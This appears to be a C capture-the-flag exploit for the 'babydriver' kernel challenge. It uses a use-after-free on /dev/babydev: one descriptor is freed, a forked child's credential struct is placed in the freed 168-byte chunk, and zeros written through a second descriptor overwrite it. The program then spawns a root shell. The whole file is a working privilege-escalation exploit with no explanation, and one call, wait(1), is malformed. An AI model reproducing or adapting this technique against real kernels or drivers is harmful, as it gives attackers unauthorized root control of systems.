#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
   
int main()
{
    int fd1,fd2, pid;
    char fake_cred[30] = {0};
  
    // babyopen()
    if ((fd1 = open("/dev/babydev", O_RDWR)) < 0){
        printf("[-] Cannot open /dev/babydev.\n");
        exit(0);
    }
 
    // babyopen()
    if ((fd2 = open("/dev/babydev", O_RDWR)) < 0){
        printf("[-] Cannot open /dev/babydev.\n");
        exit(0);
    }
 
    // babyioctl()
    if (ioctl(fd1, 65537, 168) < 0){
        printf("[-] ioctl Error\n");
        exit(0);
    }
 
    // babyrelease()
    if (close(fd1) != 0){
        printf("[-] Cannot close fd1\n");
        exit(0);
    }
   
    // allocate cred struct in 168 heap chunk
    pid = fork();
    if(pid < 0){
        printf("[-] fork error\n");
        exit(0);
    }else if(pid == 0){
        write(fd2, fake_cred, 28);
 
        if(getuid() == 0){
            printf("[+] root now\n");
            system("/bin/sh");
            exit(0);
        }else{
            printf("[-] UID : %d\n",getuid());
        }
    }else{
        wait(1);
    }
 
    if (close(fd2) != 0){
        printf("[-] Cannot close\n");
    }
 
    return 0;
}
